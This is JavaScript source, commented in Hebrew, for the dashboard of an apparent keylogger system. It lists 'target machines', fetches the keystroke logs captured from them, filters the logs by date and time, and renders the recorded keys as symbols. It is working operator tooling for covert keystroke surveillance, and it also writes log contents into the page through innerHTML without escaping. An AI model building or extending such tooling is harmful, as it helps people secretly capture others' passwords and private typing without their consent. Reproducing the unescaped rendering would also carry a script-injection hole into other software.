let currentMachine = null;
const API_BASE = "http://localhost:5000/api";

// פונקציית עזר לתצוגת הודעות דיבוג
function showDebug(message) {
  const debugDiv = document.getElementById("debug-info");
  const timestamp = new Date().toLocaleTimeString();
  debugDiv.innerHTML += `[${timestamp}] ${message}<br>`;
  debugDiv.scrollTop = debugDiv.scrollHeight;
}

// פונקציה לתצוגת שגיאות
function showError(message) {
  const logsContainer = document.getElementById("logs-container");
  logsContainer.innerHTML = `<div class="error">שגיאה: ${message}</div>`;
}

// פונקציה לתצוגת הצלחה
function showSuccess(message) {
  const logsContainer = document.getElementById("logs-container");
  const successDiv = document.createElement('div');
  successDiv.className = 'success';
  successDiv.textContent = message;
  logsContainer.insertBefore(successDiv, logsContainer.firstChild);
}

// משיכת רשימת מחשבים מהשרת
async function fetchMachines() {
  try {
    showDebug("מנסה להביא רשימת מחשבים...");
    const res = await fetch(`${API_BASE}/get_target_machines_list`);
    
    if (!res.ok) {
      throw new Error(`שגיאת HTTP: ${res.status}`);
    }
    
    const machines = await res.json();
    showDebug(`נמצאו ${machines.length} מחשבים: ${machines.join(', ')}`);
    
    const machinesSelect = document.getElementById("machines");
    machinesSelect.innerHTML = "";
    
    // הוספת אפשרות ברירת מחדל
    const defaultOption = document.createElement("option");
    defaultOption.value = "";
    defaultOption.textContent = "בחר מחשב...";
    machinesSelect.appendChild(defaultOption);
    
    machines.forEach(machine => {
      const option = document.createElement("option");
      option.value = machine;
      option.textContent = machine;
      machinesSelect.appendChild(option);
    });
    
    if (machines.length > 0) {
      currentMachine = machines[0];
      machinesSelect.value = machines[0];
    }
  } catch (err) {
    console.error("Error fetching machines:", err);
    showError(`לא ניתן להביא רשימת מחשבים: ${err.message}`);
  }
}

// בחירת מחשב
function selectMachine(machine) {
  currentMachine = machine;
  showDebug(`נבחר מחשב: ${machine}`);
}

// שליפת כל הלוגים
async function fetchAllLogs() {
  if (!currentMachine) {
    alert("נא לבחור מחשב תחילה");
    return;
  }
  
  try {
    showDebug(`מביא את כל הלוגים עבור מחשב: ${currentMachine}`);
    const res = await fetch(`${API_BASE}/get_keystrokes?machine=${encodeURIComponent(currentMachine)}`);
    
    if (!res.ok) {
      throw new Error(`שגיאת HTTP: ${res.status}`);
    }
    
    const data = await res.json();
    displayLogs(data, false); // false = הצג הכל
    
  } catch (err) {
    console.error("Error fetching all logs:", err);
    showError(`שגיאה בהבאת הלוגים: ${err.message}`);
  }
}

// שליפת לוג לפי תאריך ושעה
async function fetchLogsByDate() {
  if (!currentMachine) {
    alert("נא לבחור מחשב תחילה");
    return;
  }
  
  const datetimeInput = document.getElementById("log-datetime").value;
  if (!datetimeInput || datetimeInput.trim() === "") {
    alert("נא לבחור תאריך ושעה");
    return;
  }
  
  try {
    showDebug(`מחפש לוגים עבור: ${currentMachine} בתאריך: ${datetimeInput}`);
    
    // שליחת בקשה לשרת עם פרמטר סינון
    const res = await fetch(
      `${API_BASE}/get_keystrokes?machine=${encodeURIComponent(currentMachine)}&datetime=${encodeURIComponent(datetimeInput)}&filter=true`
    );
    
    if (!res.ok) {
      throw new Error(`שגיאת HTTP: ${res.status}`);
    }
    
    const data = await res.json();
    showDebug(`קיבלנו ${data.logs ? data.logs.length : 0} לוגים`);
    displayLogs(data, true); // true = הצג רק תוצאות מסוננות
    
  } catch (err) {
    console.error("Error fetching logs by date:", err);
    showError(`שגיאה בחיפוש לוגים: ${err.message}`);
  }
}

// פונקציה לסינון הלוגים בצד הלקוח
function filterLogsByDatetime(content, targetDatetime) {
  if (!content || !targetDatetime) return '';
  
  const lines = content.split('\n');
  const filteredLines = [];
  
  // המרה מ YYYY-MM-DDTHH:MM ל [YYYY-MM-DD HH:MM
  const dateStr = targetDatetime.split('T')[0];
  const timeStr = targetDatetime.split('T')[1].substring(0, 5);
  const prefix = `[${dateStr} ${timeStr}`;
  
  showDebug(`מחפש בלוק עם הפרפיקס: "${prefix}"`);
  
  let capturing = false;
  let foundMatch = false;
  
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    
    // בדיקה אם השורה מתחילה עם התאריך והשעה שמחפשים
    if (line.startsWith(prefix)) {
      capturing = true;
      foundMatch = true;
      filteredLines.push(line);
      showDebug(`נמצאה התאמה: ${line}`);
    } else if (capturing) {
      // אם אנחנו במצב לכידה, בדוק אם זה סוף הבלוק
      if (line.trim() === "==================================================") {
        // בדוק אם השורה הבאה מתחילה עם תאריך חדש
        const nextLine = i + 1 < lines.length ? lines[i + 1] : "";
        if (nextLine.match(/^\[\d{4}-\d{2}-\d{2} \d{2}:\d{2}/)) {
          // זה סוף הבלוק שלנו
          filteredLines.push(line);
          break;
        }
        filteredLines.push(line);
      } else {
        filteredLines.push(line);
      }
    }
  }
  
  const result = filteredLines.join('\n');
  if (!foundMatch) {
    showDebug(`לא נמצא תוכן עבור התאריך: ${targetDatetime}`);
    return '';
  }
  
  showDebug(`נמצאו ${filteredLines.length} שורות עבור התאריך`);
  return result;
}

// תצוגת הלוגים
function displayLogs(data, isFiltered) {
  const logsContainer = document.getElementById("logs-container");
  
  if (!data.logs || data.logs.length === 0) {
    const message = isFiltered ? 
      "לא נמצאו לוגים עבור התאריך והשעה המבוקשים" : 
      "לא נמצאו לוגים";
    logsContainer.innerHTML = `<h2>${message}</h2>`;
    return;
  }
  
  const title = isFiltered ? "לוגים מסוננים:" : "כל הלוגים:";
  logsContainer.innerHTML = `<h2>${title}</h2>`;
  
  data.logs.forEach(logObj => {
    const filename = Object.keys(logObj)[0];
    let content = logObj[filename];
    
    // אם זה סינון בצד הלקוח ויש תאריך נבחר
    if (isFiltered) {
      const datetimeInput = document.getElementById("log-datetime").value;
      if (datetimeInput) {
        content = filterLogsByDatetime(content, datetimeInput);
        if (!content.trim()) {
          showDebug(`לא נמצא תוכן עבור ${datetimeInput} בקובץ ${filename}`);
          return;
        }
      }
    }
    
    const logDiv = document.createElement("div");
    logDiv.className = "log";
    
    // עיבוד התוכן לתצוגה ברורה יותר
    const processedContent = processLogContent(content);
    
    logDiv.innerHTML = `
      <h3>📄 ${filename}</h3>
      <pre>${processedContent}</pre>
    `;
    
    logsContainer.appendChild(logDiv);
  });
  
  const logCount = data.logs.length;
  const successMessage = isFiltered ? 
    `נמצאו ${logCount} לוגים מסוננים` : 
    `הוצגו ${logCount} לוגים`;
  showSuccess(successMessage);
}

// עיבוד תוכן הלוג לתצוגה ברורה
function processLogContent(content) {
  if (!content) return '';
  
  return content
    .replace(/\[BACKSPACE\]/g, '⌫')
    .replace(/\[Key\.up\]/g, '↑')
    .replace(/\[Key\.down\]/g, '↓')
    .replace(/\[Key\.left\]/g, '←')
    .replace(/\[Key\.right\]/g, '→')
    .replace(/\[Key\.enter\]/g, '⏎')
    .replace(/\[Key\.space\]/g, '␣')
    .replace(/\[Key\.tab\]/g, '⇥')
    .replace(/\[Key\.shift\]/g, '⇧')
    .replace(/\[Key\.ctrl\]/g, '⌃')
    .replace(/\[Key\.alt\]/g, '⌥')
    .replace(/<ctl>/g, '[CTRL]')
    .replace(/\[Key\.esc\]/g, '[ESC]')
    .replace(/\[Key\.media_volume_up\]/g, '[VOL+]')
    .replace(/\[Key\.cmd\]/g, '[CMD]')
    .replace(/\[Key\.shift_r\]/g, '[SHIFT-R]')
    .replace(/\[Key\.alt_l\]/g, '[ALT-L]')
    // הדגשת תאריכים ושעות
    .replace(/(\[\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}\])/g, '<span class="timestamp">$1</span>');
}

// ניקוי תוצאות
function clearResults() {
  document.getElementById("logs-container").innerHTML = "<h2>לוגים יוצגו כאן</h2>";
  document.getElementById("debug-info").innerHTML = "";
}

// אתחול האפליקציה
document.addEventListener('DOMContentLoaded', function() {
  showDebug("מאתחל אפליקציה...");
  fetchMachines();
  
  // הגדרת תאריך ברירת מחדל לעכשיו
  const now = new Date();
  now.setMinutes(now.getMinutes() - now.getTimezoneOffset());
  document.getElementById('log-datetime').value = now.toISOString().slice(0, 16);
});